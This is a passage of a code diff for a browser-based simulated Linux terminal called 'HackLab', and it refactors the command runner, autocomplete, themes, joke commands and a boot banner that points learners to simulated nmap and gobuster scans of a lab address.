+  writeRaw(`<span class="c-green">The Matrix has you.</span>`);
+  writeRaw(`<span class="c-green">Follow the white rabbit. 🐇</span>`);
+  writeRaw(`<span class="c-dim">(try resizing the window — some say the rain is watching)</span>`);
+};
+
+C.hack = () => {
+  writeRaw(`<span class="c-red bold">██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗ </span>`);
+  writeRaw(`<span class="c-red bold">██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝ </span>`);
+  writeRaw(`<span class="c-yellow bold">███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗</span>`);
+  writeRaw(`<span class="c-yellow bold">██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║</span>`);
+  writeRaw(`<span class="c-green bold">██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝</span>`);
+  writeRaw(`<span class="c-green bold">╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ </span>`);
+  writeRaw(``);
+  writeRaw(`<span class="c-green">Access GRANTED (jk — this is a simulator 😎)</span>`);
+  writeRaw(`<span class="c-dim">Real skill = knowing this must be LEGAL.</span>`);
 };
 
 C.party = () => {
-  unlock('party');
-  write(`<span class="ok">🎉 PARTY MODE ACTIVATED 🎉</span>`);
-  document.body.style.transition = 'filter 0.3s';
+  writeRaw(`<span class="c-green bold">🎉 PARTY MODE ACTIVATED 🎉</span>`);
   let hue = 0;
   const iv = setInterval(() => {
     hue = (hue + 30) % 360;
@@ -1494,100 +1916,163 @@ C.party = () => {
   setTimeout(() => {
     clearInterval(iv);
     document.body.style.filter = '';
-    write(`<span class="dim">party over. back to hacking.</span>`);
+    writeRaw(`<span class="c-dim">party over. back to hacking.</span>`);
   }, 4000);
 };
 
-C.coffee = () => {
-  write(`<span class="warn">      ( (`);
-  write(`       ) )`);
-  write(`    ........`);
-  write(`    |      |]`);
-  write(`    \\      /`);
-  write(`     \`----'</span>`);
-  write(``);
-  write(`<span class="dim">Caffeine level: critical. Refill immediately.</span>`);
-};
-
-C.sudo = (a) => {
-  if (!a.length) return write('usage: sudo <command>', 'err');
-  write(`[sudo] password for kali:`);
-  write(`<span class="err">Sorry, try again.</span>`);
-  write(`<span class="dim">(sudo disabled in sim — you don't need root to learn.)</span>`);
-};
-
+C.echo2 = C.echo;
 C['?'] = C.help;
-C.exit = () => write(`<span class="warn">There is no escape from learning. 😈 (type 'clear')</span>`);
 
-/* Run command */
+/* ============================================================
+   COMMAND RUNNER
+   ============================================================ */
 function run(raw) {
   const trimmed = raw.trim();
-  if (!trimmed) { write(prompt()); return; }
-  history.push(trimmed);
-  historyIdx = history.length;
-  cmdCount++;
-  cmdCounter.textContent = cmdCount + ' cmds';
+  if (!trimmed) { writeRaw(promptStr() + ' '); return; }
 
-  write(prompt() + ' ' + esc(trimmed));
-  beep(500 + Math.random()*300, 0.02, 'square', 0.02);
+  state.history.push(trimmed);
+  state.cmdCount++;
+  updateCmdCount();
+  saveState();
 
-  if (cmdCount === 1) unlock('firstCmd');
-  if (cmdCount === 10) unlock('cmdMaster');
-  if (cmdCount === 25) unlock('legend');
+  writeRaw(promptStr() + ' ' + escape(trimmed));
+  beep(500 + Math.random() * 400, 0.02, 'square', 0.02);
 
+  // Aliases
   const parts = trimmed.split(/\s+/);
-  const cmd = parts[0].toLowerCase();
-  const args = parts.slice(1);
+  let cmd = parts[0].toLowerCase();
+  let args = parts.slice(1);
 
-  if (cmd === 'help') unlock('helpUser');
+  if (state.alias[cmd]) {
+    const expanded = state.alias[cmd].split(/\s+/);
+    cmd = expanded[0];
+    args = [...expanded.slice(1), ...args];
+  }
 
   if (C[cmd]) {
-    try { C[cmd](args); } catch (e) { write('error: ' + e.message, 'err'); }
+    try { C[cmd](args); } catch (e) { writeRaw(`<span class="c-red">error: ${escape(e.message)}</span>`); }
   } else {
-    write(`${esc(cmd)}: command not found. Type 'help'.`, 'err');
+    writeRaw(`<span class="c-red">${escape(cmd)}: command not found.</span> <span class="c-dim">Type 'help' for available commands.</span>`);
+    // Suggest similar
+    const sims = Object.keys(C).filter(k => k.startsWith(cmd[0])).slice(0, 4);
+    if (sims.length) writeRaw(`<span class="c-dim">Did you mean: ${sims.join(', ')}?</span>`);
   }
 }
 
-/* Input events */
-cmdInput.addEventListener('keydown', (e) => {
+/* ============================================================
+   INPUT EVENTS
+   ============================================================ */
+input.addEventListener('keydown', (e) => {
   if (e.key === 'Enter') {
     e.preventDefault();
-    const v = cmdInput.value;
-    cmdInput.value = '';
+    const v = input.value;
+    input.value = '';
+    hideAutocomplete();
     run(v);
   } else if (e.key === 'ArrowUp') {
     e.preventDefault();
-    if (historyIdx > 0) { historyIdx--; cmdInput.value = history[historyIdx]; }
+    if (autocompleteMatches.length) {
+      autocompleteIdx = Math.max(0, autocompleteIdx - 1);
+      autocompleteEl.querySelectorAll('.item').forEach((el, i) => el.classList.toggle('active', i === autocompleteIdx));
+      return;
+    }
+    if (historyIdx > 0) { historyIdx--; input.value = state.history[historyIdx] || ''; }
   } else if (e.key === 'ArrowDown') {
     e.preventDefault();
-    if (historyIdx < history.length - 1) { historyIdx++; cmdInput.value = history[historyIdx]; }
-    else { historyIdx = history.length; cmdInput.value = ''; }
+    if (autocompleteMatches.length) {
+      autocompleteIdx = Math.min(autocompleteMatches.length - 1, autocompleteIdx + 1);
+      autocompleteEl.querySelectorAll('.item').forEach((el, i) => el.classList.toggle('active', i === autocompleteIdx));
+      return;
+    }
+    if (historyIdx < state.history.length - 1) { historyIdx++; input.value = state.history[historyIdx] || ''; }
+    else { historyIdx = state.history.length; input.value = ''; }
   } else if (e.key === 'Tab') {
     e.preventDefault();
-    const parts = cmdInput.value.split(' ');
-    const last = parts[parts.length - 1];
+    const val = input.value;
+    const parts = val.split(' ');
+    const last = parts[parts.length - 1] || '';
+    let matches = [];
     if (parts.length === 1) {
-      const m = Object.keys(C).filter(c => c.startsWith(last));
-      if (m.length === 1) cmdInput.value = m[0] + ' ';
-      else if (m.length > 1) write(m.join('   '), 'dim');
+      matches = Object.keys(C).filter(c => c.startsWith(last)).sort();
     } else {
-      const files = fs[cwd] || [];
-      const m = files.filter(f => f.startsWith(last));
-      if (m.length === 1) {
-        parts[parts.length - 1] = m[0];
-        cmdInput.value = parts.join(' ');
-      } else if (m.length > 1) write(m.join('   '), 'dim');
+      const fs = getFS();
+      matches = (fs[state.cwd] || []).filter(f => f.startsWith(last)).sort();
     }
+    if (matches.length === 1) {
+      applyCompletion(matches[0]);
+    } else if (matches.length > 1) {
+      // find longest common prefix
+      let lcp = matches[0];
+      for (const m of matches) {
+        let i = 0;
+        while (i < lcp.length && i < m.length && lcp[i] === m[i]) i++;
+        lcp = lcp.slice(0, i);
+      }
+      if (lcp.length > last.length) {
+        applyCompletion(lcp);
+      } else {
+        showAutocomplete(matches, last);
+      }
+    }
+  } else if (e.key === 'Escape') {
+    hideAutocomplete();
   } else if (e.key === 'l' && e.ctrlKey) {
     e.preventDefault();
-    termBody.innerHTML = '';
+    term.innerHTML = '';
+  } else if (e.key === 'c' && e.ctrlKey) {
+    e.preventDefault();
+    writeRaw(promptStr() + ' ' + escape(input.value) + '<span class="c-red">^C</span>');
+    input.value = '';
   }
 });
 
-document.getElementById('terminalWrap').addEventListener('click', () => cmdInput.focus());
+input.addEventListener('input', () => {
+  const val = input.value;
+  const parts = val.split(' ');
+  const last = parts[parts.length - 1] || '';
+  if (!last) { hideAutocomplete(); return; }
+  let matches = [];
+  if (parts.length === 1) {
+    matches = Object.keys(C).filter(c => c.startsWith(last)).slice(0, 8);
+  } else {
+    const fs = getFS();
+    matches = (fs[state.cwd] || []).filter(f => f.startsWith(last)).slice(0, 8);
+  }
+  if (matches.length > 1) showAutocomplete(matches, last);
+  else hideAutocomplete();
+});
 
-/* Boot terminal */
-(function termBoot() {
+document.body.addEventListener('click', () => input.focus());
+
+/* ============================================================
+   THEME / SOUND / FULLSCREEN
+   ============================================================ */
+themeSelect.addEventListener('change', () => {
+  state.theme = themeSelect.value;
+  saveState();
+  updatePrompt();
+});
+document.getElementById('soundBtn').addEventListener('click', (e) => {
+  soundOn = !soundOn;
+  e.currentTarget.textContent = soundOn ? '🔊' : '🔇';
+  beep(soundOn ? 1200 : 400, 0.08);
+});
+document.getElementById('fullBtn').addEventListener('click', () => {
+  if (!document.fullscreenElement) document.documentElement.requestFullscreen();
+  else document.exitFullscreen();
+});
+
+/* ============================================================
+   CLOCK
+   ============================================================ */
+setInterval(() => {
+  sbClock.textContent = new Date().toTimeString().slice(0, 8);
+}, 1000);
+
+/* ============================================================
+   BOOT SEQUENCE
+   ============================================================ */
+(function boot() {
   const art = [
     "  _   _            _    _          _     ",
     " | | | | __ _  ___| | _| |    __ _| |__  ",
@@ -1595,43 +2080,23 @@ document.getElementById('terminalWrap').addEventListener('click', () => cmdInput
     " |  _  | (_| | (__|   <| |__| (_| | |_) |",
     " |_| |_|\\__,_|\\___|_|\\_\\_____\\__,_|_.__/ "
   ].join('\n');
-  write(`<span class="ok">${esc(art)}</span>`);
-  write(`<span class="dim">Simulated shell v4 — for education only. No real network access.</span>`);
-  write(`<span class="dim">────────────────────────────────────────────────────────────────</span>`);
-  write(`Welcome, future white hat. Type <span class="ok">help</span> to begin.`);
-  write(`Try: <span class="info">targets</span> → <span class="info">nmap 10.10.10.5</span> → <span class="info">gobuster dir -u http://10.10.10.5 -w wordlist.txt</span>`);
-  write(``);
+  writeRaw(`<span class="c-green bold">${escape(art)}</span>`);
+  writeRaw(`<span class="c-dim">HackLab Terminal v5 — Simulated Linux Shell</span>`);
+  writeRaw(`<span class="c-dim">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>`);
+  writeRaw(`<span class="c-cyan">Type</span> <span class="c-green bold">help</span> <span class="c-cyan">to see all 60+ commands.</span>`);
+  writeRaw(`<span class="c-cyan">Try</span> <span class="c-green bold">neofetch</span><span class="c-cyan">,</span> <span class="c-green bold">tree</span><span class="c-cyan">,</span> <span class="c-green bold">cat notes.txt</span><span class="c-cyan">,</span> <span class="c-green bold">nmap 10.10.10.5</span>`);
+  writeRaw(`<span class="c-cyan">Become root with</span> <span class="c-red bold">sudo su</span> <span class="c-cyan">→</span> <span class="c-green">cat /root/root.txt</span>`);
+  writeRaw(`<span class="c-dim">Your files & theme persist in localStorage. Tab = autocomplete.</span>`);
+  writeRaw(``);
   updatePrompt();
-  setTimeout(() => cmdInput.focus(), 500);
+  updateCmdCount();
+  if (state.cmdCount > 0) {
+    writeRaw(`<span class="c-dim">Welcome back. You've run ${state.cmdCount} commands so far.</span>`);
+  }
+  setTimeout(() => input.focus(), 200);
 })();
 
-/* ============ KONAMI CODE EASTER EGG ============ */
-(function konami() {
-  const code = ['ArrowUp','ArrowUp','ArrowDown','ArrowDown','ArrowLeft','ArrowRight','ArrowLeft','ArrowRight','b','a'];
-  let idx = 0;
-  document.addEventListener('keydown', (e) => {
-    const k = e.key.length === 1 ? e.key.toLowerCase() : e.key;
-    if (k === code[idx]) {
-      idx++;
-      if (idx === code.length) {
-        unlock('konami');
-        document.body.style.transition = 'filter 0.4s';
-        let hue = 0;
-        const iv = setInterval(() => {
-          hue = (hue + 25) % 360;
-          document.body.style.filter = `hue-rotate(${hue}deg) saturate(1.5)`;
-        }, 100);
-        setTimeout(() => { clearInterval(iv); document.body.style.filter = ''; }, 5000);
-        idx = 0;
-      }
-    } else { idx = 0; }
-  });
-})();
-
-/* ============ CLICK SOUNDS ON CARDS ============ */
-document.querySelectorAll('.card, .resource').forEach(el => {
-  el.addEventListener('click', () => beep(1100, 0.04, 'sine', 0.03));
-});
+window.addEventListener('load', () => input.focus());
 </script>
 
 </body>
